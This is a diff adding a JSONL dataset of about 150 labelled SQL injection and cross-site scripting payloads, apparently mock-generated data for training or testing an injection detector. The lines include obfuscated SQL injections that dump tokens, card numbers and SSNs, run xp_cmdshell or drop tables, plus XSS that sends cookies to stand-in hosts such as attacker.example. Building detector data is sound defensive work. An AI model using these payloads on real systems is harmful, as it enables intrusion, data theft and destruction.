@@ -1,0 +1,150 @@
+{"label": 1, "attack_type": "sqli", "family": "tautology", "profile": "polymorphic", "payload": "1 UNION SELECT 0x2066a4c60eb4,0xf2657f62f2a5--", "source": "MOCK_deepseek_polymorphic_PLACEHOLDER"}
+{"label": 1, "attack_type": "sqli", "family": "time_based_blind", "profile": "polymorphic", "payload": "\" wAiTFOr deLAy '0:0:05'-- cOmmeNt", "source": "MOCK_deepseek_polymorphic_PLACEHOLDER"}
+{"label": 1, "attack_type": "sqli", "family": "time_based_blind", "profile": "polymorphic", "payload": "4316\" waitFOR deLAy '0:0:08'#", "source": "MOCK_deepseek_polymorphic_PLACEHOLDER"}
+{"label": 1, "attack_type": "xss", "family": "reflected", "profile": "polymorphic", "payload": "<script>String.fromCharCode(97,108,101,114,116,40,49,41)</script>", "source": "MOCK_deepseek_polymorphic_PLACEHOLDER"}
+{"label": 1, "attack_type": "sqli", "family": "time_based_blind", "profile": "polymorphic", "payload": "3609'/**/aND/**/sLEep(9)--/**/cOmmEnt", "source": "MOCK_deepseek_polymorphic_PLACEHOLDER"}
+{"label": 1, "attack_type": "sqli", "family": "time_based_blind", "profile": "polymorphic", "payload": "7180' WAitfoR DelAy '0:0:06'#", "source": "MOCK_deepseek_polymorphic_PLACEHOLDER"}
+{"label": 1, "attack_type": "sqli", "family": "time_based_blind", "profile": "polymorphic", "payload": "'/**/And/**/sLeEp(2)/**/", "source": "MOCK_deepseek_polymorphic_PLACEHOLDER"}
+{"label": 1, "attack_type": "sqli", "family": "stacked_query", "profile": "polymorphic", "payload": "\"; exEc Xp_CMDshElL('IpCOnFig')-- cOMmENT", "source": "MOCK_deepseek_polymorphic_PLACEHOLDER"}
+{"label": 1, "attack_type": "sqli", "family": "stacked_query", "profile": "polymorphic", "payload": "1 UNION SELECT 0x4ffd82391db9,0xee21a4d7f297--", "source": "MOCK_deepseek_polymorphic_PLACEHOLDER"}
+{"label": 1, "attack_type": "sqli", "family": "auth_bypass", "profile": "polymorphic", "payload": "support'-- comment", "source": "MOCK_deepseek_polymorphic_PLACEHOLDER"}
+{"label": 1, "attack_type": "sqli", "family": "boolean_blind", "profile": "polymorphic", "payload": "1 UNION SELECT 0x283b2a48ee13,0x9ea8967408cb--", "source": "MOCK_deepseek_polymorphic_PLACEHOLDER"}
+{"label": 1, "attack_type": "xss", "family": "reflected", "profile": "polymorphic", "payload": "%3Csvg%3E%3Cscript%3Ealert(1)%3C/script%3E%3C/svg%3E", "source": "MOCK_deepseek_polymorphic_PLACEHOLDER"}
+{"label": 1, "attack_type": "sqli", "family": "error_based", "profile": "polymorphic", "payload": "'/**/aND/**/3=cAsT((SeLect/**/@@vErSION)/**/AS/**/int)/*x*/", "source": "MOCK_deepseek_polymorphic_PLACEHOLDER"}
+{"label": 1, "attack_type": "xss", "family": "reflected", "profile": "polymorphic", "payload": "<img src=x oNeRRor=/**/(alert)(1)>", "source": "MOCK_deepseek_polymorphic_PLACEHOLDER"}
+{"label": 1, "attack_type": "xss", "family": "stored", "profile": "polymorphic", "payload": "%3CscRipT%3edocUmEnt.LOcaTIoN='HTTp://ExfiL.exAMple/SiNk?d='+DocumeNT.coOKie%3C/scRipT%3E", "source": "MOCK_deepseek_polymorphic_PLACEHOLDER"}
+{"label": 1, "attack_type": "sqli", "family": "union_based", "profile": "polymorphic", "payload": "' UnIOn sEleCT NulL,nULL,NuLL,NuLl,Null,nuLL,nULl,Null--", "source": "MOCK_deepseek_polymorphic_PLACEHOLDER"}
+{"label": 1, "attack_type": "sqli", "family": "tautology", "profile": "polymorphic", "payload": "\"/**/OR/**/yes=yes--", "source": "MOCK_deepseek_polymorphic_PLACEHOLDER"}
+{"label": 1, "attack_type": "sqli", "family": "tautology", "profile": "polymorphic", "payload": "' OR A=A-- COMmenT", "source": "MOCK_deepseek_polymorphic_PLACEHOLDER"}
+{"label": 1, "attack_type": "xss", "family": "dom_based", "profile": "polymorphic", "payload": "#%3CsCr%3CScRIpt%3EipT%3EAlert(1337)%3C/ScRIpT%3E", "source": "MOCK_deepseek_polymorphic_PLACEHOLDER"}
+{"label": 1, "attack_type": "xss", "family": "reflected", "profile": "polymorphic", "payload": "%3CscRIPt%3EAlERT(WINdOw.LoCATION)%3C/ScripT%3E", "source": "MOCK_deepseek_polymorphic_PLACEHOLDER"}
+{"label": 1, "attack_type": "xss", "family": "stored", "profile": "polymorphic", "payload": "<ScrIpT>eVaL(aTOB('yWxlCnqomsk='))</scRIPT>", "source": "MOCK_deepseek_polymorphic_PLACEHOLDER"}
+{"label": 1, "attack_type": "sqli", "family": "boolean_blind", "profile": "polymorphic", "payload": "' OR 0x31=0x31--", "source": "MOCK_deepseek_polymorphic_PLACEHOLDER"}
+{"label": 1, "attack_type": "sqli", "family": "error_based", "profile": "polymorphic", "payload": "1`;drOP/**/TABle/**/`USeRS`;--", "source": "MOCK_deepseek_polymorphic_PLACEHOLDER"}
+{"label": 1, "attack_type": "xss", "family": "reflected", "profile": "polymorphic", "payload": "<a href=\"javascript:alert(1337)\">view</a>", "source": "MOCK_deepseek_polymorphic_PLACEHOLDER"}
+{"label": 1, "attack_type": "sqli", "family": "auth_bypass", "profile": "polymorphic", "payload": "AdmInISTRator%27--%20CoMMenT", "source": "MOCK_deepseek_polymorphic_PLACEHOLDER"}
+{"label": 1, "attack_type": "sqli", "family": "time_based_blind", "profile": "polymorphic", "payload": "\" WaitfOr DElAY '0:0:10'--", "source": "MOCK_deepseek_polymorphic_PLACEHOLDER"}
+{"label": 1, "attack_type": "sqli", "family": "auth_bypass", "profile": "polymorphic", "payload": "ADmIn41'#", "source": "MOCK_deepseek_polymorphic_PLACEHOLDER"}
+{"label": 1, "attack_type": "xss", "family": "stored", "profile": "polymorphic", "payload": "<svg><animate onbegin=alert(1) attributeName=x>", "source": "MOCK_deepseek_polymorphic_PLACEHOLDER"}
+{"label": 1, "attack_type": "sqli", "family": "error_based", "profile": "polymorphic", "payload": "'/**/un/**/ion/**/sEL/**/ECt/**/1,2,3--", "source": "MOCK_deepseek_polymorphic_PLACEHOLDER"}
+{"label": 1, "attack_type": "xss", "family": "dom_based", "profile": "polymorphic", "payload": "#<SvG onlOad=aLErT(lOCAlStoRage.leNgTh)>", "source": "MOCK_deepseek_polymorphic_PLACEHOLDER"}
+{"label": 1, "attack_type": "xss", "family": "dom_based", "profile": "polymorphic", "payload": "<script>eval(atob('YWxlcnQoMSk='))</script>", "source": "MOCK_deepseek_polymorphic_PLACEHOLDER"}
+{"label": 1, "attack_type": "sqli", "family": "union_based", "profile": "polymorphic", "payload": "1 UNION SELECT 0x56a9b91bcf79,0x0c272c472b48--", "source": "MOCK_deepseek_polymorphic_PLACEHOLDER"}
+{"label": 1, "attack_type": "sqli", "family": "error_based", "profile": "polymorphic", "payload": "' AND UPDATEXML(1,CONCAT(0x7e,(SELECT VERSION()),0x7e),1)-- -", "source": "MOCK_deepseek_polymorphic_PLACEHOLDER"}
+{"label": 1, "attack_type": "xss", "family": "reflected", "profile": "polymorphic", "payload": "<AUDio sRc=X oneRrOr=alerT(navigaTor.UsErAGENt)>", "source": "MOCK_deepseek_polymorphic_PLACEHOLDER"}
+{"label": 1, "attack_type": "xss", "family": "reflected", "profile": "polymorphic", "payload": "<svg><scr<script>ipt>alert(window.location)</script></svg>", "source": "MOCK_deepseek_polymorphic_PLACEHOLDER"}
+{"label": 1, "attack_type": "sqli", "family": "time_based_blind", "profile": "polymorphic", "payload": "'/**/uN/**/iOn/**/Sel/**/eCt/**/1,2,3--", "source": "MOCK_deepseek_polymorphic_PLACEHOLDER"}
+{"label": 1, "attack_type": "xss", "family": "reflected", "profile": "polymorphic", "payload": "%3Cscript%3Eprompt('xss')%3C/script%3E", "source": "MOCK_deepseek_polymorphic_PLACEHOLDER"}
+{"label": 1, "attack_type": "sqli", "family": "time_based_blind", "profile": "polymorphic", "payload": "' wAitFOR DeLaY '0:0:08'/**/", "source": "MOCK_deepseek_polymorphic_PLACEHOLDER"}
+{"label": 1, "attack_type": "xss", "family": "dom_based", "profile": "polymorphic", "payload": "#<scRiPt>PRomPT('xSs')</sCRiPt>", "source": "MOCK_deepseek_polymorphic_PLACEHOLDER"}
+{"label": 1, "attack_type": "xss", "family": "dom_based", "profile": "polymorphic", "payload": "#<img src=x onerror=alert(1)>", "source": "MOCK_deepseek_polymorphic_PLACEHOLDER"}
+{"label": 1, "attack_type": "sqli", "family": "error_based", "profile": "polymorphic", "payload": "' aNd ExtRaCtVAlue(5,CONCAT(0X7e,(SElEct @@verSiOn)))--", "source": "MOCK_deepseek_polymorphic_PLACEHOLDER"}
+{"label": 1, "attack_type": "sqli", "family": "stacked_query", "profile": "polymorphic", "payload": "4924; dROp tABle sesSIONS/*X*/", "source": "MOCK_deepseek_polymorphic_PLACEHOLDER"}
+{"label": 1, "attack_type": "xss", "family": "stored", "profile": "polymorphic", "payload": "<SCRipt>new iMage().SRC='htTp://cOLlEcTOR.ExAMPLe/cOLLecT?ck='+DocumEnt.COOKIE</scRiPT>", "source": "MOCK_deepseek_polymorphic_PLACEHOLDER"}
+{"label": 1, "attack_type": "xss", "family": "stored", "profile": "polymorphic", "payload": "<SCript>NeW ImAgE().srC='hTTP://CollecTOr.exaMPlE/log?ToKEN='+DOCumEnT.cOokIE</SCrIPT>", "source": "MOCK_deepseek_polymorphic_PLACEHOLDER"}
+{"label": 1, "attack_type": "sqli", "family": "stacked_query", "profile": "polymorphic", "payload": "'; EXEC xp_cmdshell('type C:\\\\boot.ini')/**/", "source": "MOCK_deepseek_polymorphic_PLACEHOLDER"}
+{"label": 1, "attack_type": "xss", "family": "reflected", "profile": "polymorphic", "payload": "&#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;", "source": "MOCK_deepseek_polymorphic_PLACEHOLDER"}
+{"label": 1, "attack_type": "sqli", "family": "boolean_blind", "profile": "polymorphic", "payload": "1\" aND 1=1/*x*/", "source": "MOCK_deepseek_polymorphic_PLACEHOLDER"}
+{"label": 1, "attack_type": "xss", "family": "dom_based", "profile": "polymorphic", "payload": "#%3CSCriPT%3EprOMPT(1)%3C/SCriPT%3E", "source": "MOCK_deepseek_polymorphic_PLACEHOLDER"}
+{"label": 1, "attack_type": "sqli", "family": "error_based", "profile": "polymorphic", "payload": "\" AnD eXTRAcTvalUE(8,COnCat(0X7E,(seLEct @@vErSION)))#", "source": "MOCK_deepseek_polymorphic_PLACEHOLDER"}
+{"label": 1, "attack_type": "sqli", "family": "auth_bypass", "profile": "polymorphic", "payload": "1'%09or%091=1%09--%09-", "source": "MOCK_deepseek_polymorphic_PLACEHOLDER"}
+{"label": 1, "attack_type": "sqli", "family": "time_based_blind", "profile": "polymorphic", "payload": "1413\" WAITFOR DELAY '0:0:04'/**/", "source": "MOCK_deepseek_polymorphic_PLACEHOLDER"}
+{"label": 1, "attack_type": "sqli", "family": "time_based_blind", "profile": "polymorphic", "payload": "' WAITFOR DELAY '0:0:01'--", "source": "MOCK_deepseek_polymorphic_PLACEHOLDER"}
+{"label": 1, "attack_type": "xss", "family": "reflected", "profile": "polymorphic", "payload": "<a href=\"javascript:prompt(1)\">link</a>", "source": "MOCK_deepseek_polymorphic_PLACEHOLDER"}
+{"label": 1, "attack_type": "sqli", "family": "boolean_blind", "profile": "polymorphic", "payload": "12\"%20ANd%2012=12--%20CoMmeNT", "source": "MOCK_deepseek_polymorphic_PLACEHOLDER"}
+{"label": 1, "attack_type": "sqli", "family": "time_based_blind", "profile": "polymorphic", "payload": "'/**/WAITFOR/**/DELAY/**/'0:0:07'/**/", "source": "MOCK_deepseek_polymorphic_PLACEHOLDER"}
+{"label": 1, "attack_type": "sqli", "family": "union_based", "profile": "polymorphic", "payload": "\" UNION SELECT token,session_id FROM customers--", "source": "MOCK_deepseek_polymorphic_PLACEHOLDER"}
+{"label": 1, "attack_type": "xss", "family": "reflected", "profile": "polymorphic", "payload": "<ScriPt>AlERt(LOCAlsTOrAGE.lEnGTH)</SCript>", "source": "MOCK_deepseek_polymorphic_PLACEHOLDER"}
+{"label": 1, "attack_type": "sqli", "family": "boolean_blind", "profile": "polymorphic", "payload": "1`;DROP TABLE `users`;--", "source": "MOCK_deepseek_polymorphic_PLACEHOLDER"}
+{"label": 1, "attack_type": "sqli", "family": "stacked_query", "profile": "polymorphic", "payload": "'; EXEC xp_cmdshell('whoami')-- -", "source": "MOCK_deepseek_polymorphic_PLACEHOLDER"}
+{"label": 1, "attack_type": "xss", "family": "reflected", "profile": "polymorphic", "payload": "<svg><script>alert(document.title)</script></svg>", "source": "MOCK_deepseek_polymorphic_PLACEHOLDER"}
+{"label": 1, "attack_type": "sqli", "family": "union_based", "profile": "polymorphic", "payload": "\"%20unION%20sELeCt%20nULL,NULl--", "source": "MOCK_deepseek_polymorphic_PLACEHOLDER"}
+{"label": 1, "attack_type": "xss", "family": "dom_based", "profile": "polymorphic", "payload": "#<svg onLoAd=aLErT('pWn')>", "source": "MOCK_deepseek_polymorphic_PLACEHOLDER"}
+{"label": 1, "attack_type": "xss", "family": "dom_based", "profile": "polymorphic", "payload": "%3Cscript%3EString.fromCharCode(97,108,101,114,116,40,49,41)%3C/script%3E", "source": "MOCK_deepseek_polymorphic_PLACEHOLDER"}
+{"label": 1, "attack_type": "xss", "family": "reflected", "profile": "polymorphic", "payload": "<svg><script>alert('xss')</script></svg>", "source": "MOCK_deepseek_polymorphic_PLACEHOLDER"}
+{"label": 1, "attack_type": "sqli", "family": "time_based_blind", "profile": "polymorphic", "payload": "\"/**/WAitfor/**/DelAY/**/'0:0:05'--/**/-", "source": "MOCK_deepseek_polymorphic_PLACEHOLDER"}
+{"label": 1, "attack_type": "sqli", "family": "time_based_blind", "profile": "polymorphic", "payload": "9376' WAITFOR DELAY '0:0:01'/*x*/", "source": "MOCK_deepseek_polymorphic_PLACEHOLDER"}
+{"label": 1, "attack_type": "xss", "family": "dom_based", "profile": "polymorphic", "payload": "#%3Cscript%3Ealert(1)%3C/script%3E", "source": "MOCK_deepseek_polymorphic_PLACEHOLDER"}
+{"label": 1, "attack_type": "xss", "family": "dom_based", "profile": "polymorphic", "payload": "#%3CIMg sRc=X OnerRor=Alert(localSTORagE.Length)%3E", "source": "MOCK_deepseek_polymorphic_PLACEHOLDER"}
+{"label": 1, "attack_type": "sqli", "family": "boolean_blind", "profile": "polymorphic", "payload": "9' AnD 9=24/**/", "source": "MOCK_deepseek_polymorphic_PLACEHOLDER"}
+{"label": 1, "attack_type": "xss", "family": "reflected", "profile": "polymorphic", "payload": "<ScrIPt>AlErT(nAvIgAtoR.USERAGeNt)</SCRiPt>", "source": "MOCK_deepseek_polymorphic_PLACEHOLDER"}
+{"label": 1, "attack_type": "sqli", "family": "time_based_blind", "profile": "polymorphic", "payload": "6610\" aNd slEEp(20)-- -", "source": "MOCK_deepseek_polymorphic_PLACEHOLDER"}
+{"label": 1, "attack_type": "sqli", "family": "time_based_blind", "profile": "polymorphic", "payload": "1'%09oR%091=1%09--%09-", "source": "MOCK_deepseek_polymorphic_PLACEHOLDER"}
+{"label": 1, "attack_type": "sqli", "family": "tautology", "profile": "polymorphic", "payload": "' OR yes=yes/**/", "source": "MOCK_deepseek_polymorphic_PLACEHOLDER"}
+{"label": 1, "attack_type": "sqli", "family": "time_based_blind", "profile": "polymorphic", "payload": "\" WAITFOR DELAY '0:0:02'#", "source": "MOCK_deepseek_polymorphic_PLACEHOLDER"}
+{"label": 1, "attack_type": "xss", "family": "dom_based", "profile": "polymorphic", "payload": "#<SVg onloAd=aleRt(doCumeNt.DOMaIN)>", "source": "MOCK_deepseek_polymorphic_PLACEHOLDER"}
+{"label": 1, "attack_type": "sqli", "family": "tautology", "profile": "polymorphic", "payload": "1 UnIOn SeLecT 0Xd029116F71d0,0X583a1e13E162--", "source": "MOCK_deepseek_polymorphic_PLACEHOLDER"}
+{"label": 1, "attack_type": "sqli", "family": "auth_bypass", "profile": "polymorphic", "payload": "SysAdmIN'/*X*/", "source": "MOCK_deepseek_polymorphic_PLACEHOLDER"}
+{"label": 1, "attack_type": "sqli", "family": "time_based_blind", "profile": "polymorphic", "payload": "\" And slEeP(5)-- -", "source": "MOCK_deepseek_polymorphic_PLACEHOLDER"}
+{"label": 1, "attack_type": "xss", "family": "dom_based", "profile": "polymorphic", "payload": "#<SvG OnlOaD=Alert(LocAlsTorAgE.length)>", "source": "MOCK_deepseek_polymorphic_PLACEHOLDER"}
+{"label": 1, "attack_type": "xss", "family": "reflected", "profile": "polymorphic", "payload": "<audio src=x onerror=confirm('xss')>", "source": "MOCK_deepseek_polymorphic_PLACEHOLDER"}
+{"label": 1, "attack_type": "sqli", "family": "tautology", "profile": "polymorphic", "payload": "' Or z=z-- -", "source": "MOCK_deepseek_polymorphic_PLACEHOLDER"}
+{"label": 1, "attack_type": "sqli", "family": "tautology", "profile": "polymorphic", "payload": "4204\" oR '1'='1'/*X*/", "source": "MOCK_deepseek_polymorphic_PLACEHOLDER"}
+{"label": 1, "attack_type": "sqli", "family": "stacked_query", "profile": "polymorphic", "payload": "1;SELECT CASE WHEN (1=1) THEN 1 ELSE (SELECT 1 UNION SELECT 2) END--", "source": "MOCK_deepseek_polymorphic_PLACEHOLDER"}
+{"label": 1, "attack_type": "sqli", "family": "union_based", "profile": "polymorphic", "payload": "' uniOn SElECT NulL,nUll,NULL,nUlL,nULL,Null#", "source": "MOCK_deepseek_polymorphic_PLACEHOLDER"}
+{"label": 1, "attack_type": "sqli", "family": "stacked_query", "profile": "polymorphic", "payload": "'; ExeC xP_cmdsHeLL('unAME -A')--", "source": "MOCK_deepseek_polymorphic_PLACEHOLDER"}
+{"label": 1, "attack_type": "xss", "family": "stored", "profile": "polymorphic", "payload": "<scRIpT>dOcuMeNT.LOCatiON='HttP://AttACkeR.exampLe/COLLect?D='+DOCUment.Cookie</scRipT>", "source": "MOCK_deepseek_polymorphic_PLACEHOLDER"}
+{"label": 1, "attack_type": "xss", "family": "stored", "profile": "polymorphic", "payload": "<form onsubmit=alert('xss')>", "source": "MOCK_deepseek_polymorphic_PLACEHOLDER"}
+{"label": 1, "attack_type": "sqli", "family": "auth_bypass", "profile": "polymorphic", "payload": "operAtoR'/**/", "source": "MOCK_deepseek_polymorphic_PLACEHOLDER"}
+{"label": 1, "attack_type": "sqli", "family": "stacked_query", "profile": "polymorphic", "payload": "'/**/OR/**/0X31=0x31--", "source": "MOCK_deepseek_polymorphic_PLACEHOLDER"}
+{"label": 1, "attack_type": "xss", "family": "reflected", "profile": "polymorphic", "payload": "<svg><scr<script>ipt>alert('pwn')</script></svg>", "source": "MOCK_deepseek_polymorphic_PLACEHOLDER"}
+{"label": 1, "attack_type": "xss", "family": "reflected", "profile": "polymorphic", "payload": "<seLECt AutofocUS OnfoCus=AlErT(wInDow.lOCaTiOn)>", "source": "MOCK_deepseek_polymorphic_PLACEHOLDER"}
+{"label": 1, "attack_type": "xss", "family": "stored", "profile": "polymorphic", "payload": "<details open ontoggle=confirm('xss')>", "source": "MOCK_deepseek_polymorphic_PLACEHOLDER"}
+{"label": 1, "attack_type": "xss", "family": "reflected", "profile": "polymorphic", "payload": "<form OnsUbMiT=PROmpT(1)>", "source": "MOCK_deepseek_polymorphic_PLACEHOLDER"}
+{"label": 1, "attack_type": "xss", "family": "dom_based", "profile": "polymorphic", "payload": "#<svg onload=alert(document.cookie)>", "source": "MOCK_deepseek_polymorphic_PLACEHOLDER"}
+{"label": 1, "attack_type": "xss", "family": "dom_based", "profile": "polymorphic", "payload": "#%3CsvG onloAD=ALErt(DOcUMent.cOoKIe)%3E", "source": "MOCK_deepseek_polymorphic_PLACEHOLDER"}
+{"label": 1, "attack_type": "sqli", "family": "stacked_query", "profile": "polymorphic", "payload": "7802; drop TabLE SEssIONs-- -", "source": "MOCK_deepseek_polymorphic_PLACEHOLDER"}
+{"label": 1, "attack_type": "sqli", "family": "error_based", "profile": "polymorphic", "payload": "\" aND eXtraCTVALue(7,coNCat(0X7E,(SelECT @@VerSioN)))#", "source": "MOCK_deepseek_polymorphic_PLACEHOLDER"}
+{"label": 1, "attack_type": "xss", "family": "reflected", "profile": "polymorphic", "payload": "<SVG><ANImaTe oNbEgiN=AlErT(1) attriBUtEnAMe=x>", "source": "MOCK_deepseek_polymorphic_PLACEHOLDER"}
+{"label": 1, "attack_type": "xss", "family": "stored", "profile": "polymorphic", "payload": "<maRqUeE oNsTaRt=alerT(DoCuMent.cOOkIE)>", "source": "MOCK_deepseek_polymorphic_PLACEHOLDER"}
+{"label": 1, "attack_type": "xss", "family": "dom_based", "profile": "polymorphic", "payload": "#<svg onload=prompt(1)>", "source": "MOCK_deepseek_polymorphic_PLACEHOLDER"}
+{"label": 1, "attack_type": "xss", "family": "stored", "profile": "polymorphic", "payload": "<scRIPT>neW imaGe().sRc='HtTP://LiStener.eXamPLE/GRaB?daTA='+docuMeNT.coOkIE</sCRipT>", "source": "MOCK_deepseek_polymorphic_PLACEHOLDER"}
+{"label": 1, "attack_type": "sqli", "family": "error_based", "profile": "polymorphic", "payload": "\"/**/AND/**/7=cOnVeRt(iNT,(seLECt/**/@@VeRsioN))#", "source": "MOCK_deepseek_polymorphic_PLACEHOLDER"}
+{"label": 1, "attack_type": "sqli", "family": "union_based", "profile": "polymorphic", "payload": "1 UNION SELECT 0x6aeaefc14164,0xd549f842e936--", "source": "MOCK_deepseek_polymorphic_PLACEHOLDER"}
+{"label": 1, "attack_type": "sqli", "family": "union_based", "profile": "polymorphic", "payload": "' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL--", "source": "MOCK_deepseek_polymorphic_PLACEHOLDER"}
+{"label": 1, "attack_type": "xss", "family": "dom_based", "profile": "polymorphic", "payload": "#<script>alert(document.title)</script>", "source": "MOCK_deepseek_polymorphic_PLACEHOLDER"}
+{"label": 1, "attack_type": "sqli", "family": "error_based", "profile": "polymorphic", "payload": "' and UPDATeXML(1,CONcAt(0x7e,(sElEct verSIOn()),0X7E),1)#", "source": "MOCK_deepseek_polymorphic_PLACEHOLDER"}
+{"label": 1, "attack_type": "sqli", "family": "error_based", "profile": "polymorphic", "payload": "1;SELeCT Case wHen (1=1) tHEn 1 Else (selECT 1 unIOn SeleCT 2) End--", "source": "MOCK_deepseek_polymorphic_PLACEHOLDER"}
+{"label": 1, "attack_type": "sqli", "family": "union_based", "profile": "polymorphic", "payload": "' UNIOn seLeCT null,NUlL,nUll,null,null,nuLl,NULL,nuLL,NUll/**/", "source": "MOCK_deepseek_polymorphic_PLACEHOLDER"}
+{"label": 1, "attack_type": "sqli", "family": "union_based", "profile": "polymorphic", "payload": "' UniON sELEct NuLl,nulL,nUll,nULl--", "source": "MOCK_deepseek_polymorphic_PLACEHOLDER"}
+{"label": 1, "attack_type": "sqli", "family": "time_based_blind", "profile": "polymorphic", "payload": "1'%09OR%091=1%09--%09-", "source": "MOCK_deepseek_polymorphic_PLACEHOLDER"}
+{"label": 1, "attack_type": "sqli", "family": "stacked_query", "profile": "polymorphic", "payload": "'/**/UN/**/ION/**/SEL/**/ECT/**/1,2,3--", "source": "MOCK_deepseek_polymorphic_PLACEHOLDER"}
+{"label": 1, "attack_type": "sqli", "family": "time_based_blind", "profile": "polymorphic", "payload": "%27%20AND%20SLEEP(10)#", "source": "MOCK_deepseek_polymorphic_PLACEHOLDER"}
+{"label": 1, "attack_type": "xss", "family": "stored", "profile": "polymorphic", "payload": "%3CSCRipT%3ENEw imAgE().Src='HTTp://listEnER.eXaMPlE/sInK?DATA='+DOcUMENT.CooKIe%3C/SCriPt%3E", "source": "MOCK_deepseek_polymorphic_PLACEHOLDER"}
+{"label": 1, "attack_type": "xss", "family": "reflected", "profile": "polymorphic", "payload": "%3cSVg%3E%3cScrIpt%3EPROmpT('Xss')%3C/scRipt%3e%3c/SVg%3E", "source": "MOCK_deepseek_polymorphic_PLACEHOLDER"}
+{"label": 1, "attack_type": "sqli", "family": "error_based", "profile": "polymorphic", "payload": "' AND 9=CAST((SELECT @@version) AS int)-- comment", "source": "MOCK_deepseek_polymorphic_PLACEHOLDER"}
+{"label": 1, "attack_type": "sqli", "family": "time_based_blind", "profile": "polymorphic", "payload": "1;SelECT CAsE WhEn (1=1) tHeN 1 ELSE (SElECT 1 UNion sELecT 2) eND--", "source": "MOCK_deepseek_polymorphic_PLACEHOLDER"}
+{"label": 1, "attack_type": "sqli", "family": "boolean_blind", "profile": "polymorphic", "payload": "16' AND 16=24--", "source": "MOCK_deepseek_polymorphic_PLACEHOLDER"}
+{"label": 1, "attack_type": "xss", "family": "dom_based", "profile": "polymorphic", "payload": "#<SCRIpT>ALert(1337)</sCriPt>", "source": "MOCK_deepseek_polymorphic_PLACEHOLDER"}
+{"label": 1, "attack_type": "xss", "family": "stored", "profile": "polymorphic", "payload": "<script>document.location='http://collector.example/beacon?ck='+document.cookie</script>", "source": "MOCK_deepseek_polymorphic_PLACEHOLDER"}
+{"label": 1, "attack_type": "sqli", "family": "union_based", "profile": "polymorphic", "payload": "\" UNiON sELeCT carD_nuMber,cvV FROm AdmIn--", "source": "MOCK_deepseek_polymorphic_PLACEHOLDER"}
+{"label": 1, "attack_type": "sqli", "family": "stacked_query", "profile": "polymorphic", "payload": "1 UNION SELECT 0x5ec03fbea9f9,0x733366e2429d--", "source": "MOCK_deepseek_polymorphic_PLACEHOLDER"}
+{"label": 1, "attack_type": "sqli", "family": "union_based", "profile": "polymorphic", "payload": "9678'/**/unIOn/**/SelEct/**/SsN,DOb/**/frOM/**/SEssioNs--/**/-", "source": "MOCK_deepseek_polymorphic_PLACEHOLDER"}
+{"label": 1, "attack_type": "sqli", "family": "tautology", "profile": "polymorphic", "payload": "1%27%09OR%091=1%09--%09-", "source": "MOCK_deepseek_polymorphic_PLACEHOLDER"}
+{"label": 1, "attack_type": "sqli", "family": "time_based_blind", "profile": "polymorphic", "payload": "' WAItfoR deLaY '0:0:05'--", "source": "MOCK_deepseek_polymorphic_PLACEHOLDER"}
+{"label": 1, "attack_type": "xss", "family": "stored", "profile": "polymorphic", "payload": "%3cscRipt%3eFETch('HTTp://lIsTENeR.eXAmPLe/grAB?DATA='+dOCuMeNt.COOKiE)%3C/scRIpT%3E", "source": "MOCK_deepseek_polymorphic_PLACEHOLDER"}
+{"label": 1, "attack_type": "xss", "family": "reflected", "profile": "polymorphic", "payload": "<a href=\"jav&#97;script:alert(1)\">x</a>", "source": "MOCK_deepseek_polymorphic_PLACEHOLDER"}
+{"label": 1, "attack_type": "sqli", "family": "tautology", "profile": "polymorphic", "payload": "' oR x=X-- COMmENT", "source": "MOCK_deepseek_polymorphic_PLACEHOLDER"}
+{"label": 1, "attack_type": "xss", "family": "dom_based", "profile": "polymorphic", "payload": "JaVAsCrIPT:AleRt(NaVIGator.usEraGent)", "source": "MOCK_deepseek_polymorphic_PLACEHOLDER"}
+{"label": 1, "attack_type": "sqli", "family": "auth_bypass", "profile": "polymorphic", "payload": "maNager75'-- -", "source": "MOCK_deepseek_polymorphic_PLACEHOLDER"}
+{"label": 1, "attack_type": "xss", "family": "dom_based", "profile": "polymorphic", "payload": "#<img src=x onerror=alert(localStorage.length)>", "source": "MOCK_deepseek_polymorphic_PLACEHOLDER"}
+{"label": 1, "attack_type": "xss", "family": "stored", "profile": "polymorphic", "payload": "<script>fetch('http://listener.example/beacon?d='+document.cookie)</script>", "source": "MOCK_deepseek_polymorphic_PLACEHOLDER"}
+{"label": 1, "attack_type": "xss", "family": "stored", "profile": "polymorphic", "payload": "%3CScrIpT%3ENEW ImAGE().SRC='httP://listENER.EXAmPLe/COlLECT?c='+DoCuMeNT.COoKIe%3C/SCrIpT%3E", "source": "MOCK_deepseek_polymorphic_PLACEHOLDER"}
+{"label": 1, "attack_type": "xss", "family": "stored", "profile": "polymorphic", "payload": "<scr<script>ipt>new Image().src='http://listener.example/sink?ck='+document.cookie</script>", "source": "MOCK_deepseek_polymorphic_PLACEHOLDER"}
+{"label": 1, "attack_type": "sqli", "family": "boolean_blind", "profile": "polymorphic", "payload": "21\"%20aND%2021=25--%20-", "source": "MOCK_deepseek_polymorphic_PLACEHOLDER"}
+{"label": 1, "attack_type": "xss", "family": "stored", "profile": "polymorphic", "payload": "<scRIPt>fetch('htTP://listeNer.EXAmplE/C?dATa='+DOCUmEnT.coOKie)</sCripT>", "source": "MOCK_deepseek_polymorphic_PLACEHOLDER"}
+{"label": 1, "attack_type": "xss", "family": "reflected", "profile": "polymorphic", "payload": "<svg><scr<script>ipt>alert('xss')</script></svg>", "source": "MOCK_deepseek_polymorphic_PLACEHOLDER"}
+{"label": 1, "attack_type": "xss", "family": "stored", "profile": "polymorphic", "payload": "<script>new Image().src='http://attacker.example/log?ck='+document.cookie</script>", "source": "MOCK_deepseek_polymorphic_PLACEHOLDER"}
+{"label": 1, "attack_type": "sqli", "family": "tautology", "profile": "polymorphic", "payload": "3955' Or 'z'='z'-- cOMmenT", "source": "MOCK_deepseek_polymorphic_PLACEHOLDER"}
+{"label": 1, "attack_type": "sqli", "family": "tautology", "profile": "polymorphic", "payload": "\"%20oR%20z=z--%20COmMEnT", "source": "MOCK_deepseek_polymorphic_PLACEHOLDER"}
+{"label": 1, "attack_type": "xss", "family": "reflected", "profile": "polymorphic", "payload": "<script>alert(localStorage.length)</script>", "source": "MOCK_deepseek_polymorphic_PLACEHOLDER"}
+{"label": 1, "attack_type": "xss", "family": "stored", "profile": "polymorphic", "payload": "<script>document.location='http://evil.example/beacon?d='+document.cookie</script>", "source": "MOCK_deepseek_polymorphic_PLACEHOLDER"}
+{"label": 1, "attack_type": "sqli", "family": "stacked_query", "profile": "polymorphic", "payload": "%27;/**/ExEC/**/Xp_CmdSHeLL(%27WHOAMI%27)#", "source": "MOCK_deepseek_polymorphic_PLACEHOLDER"}
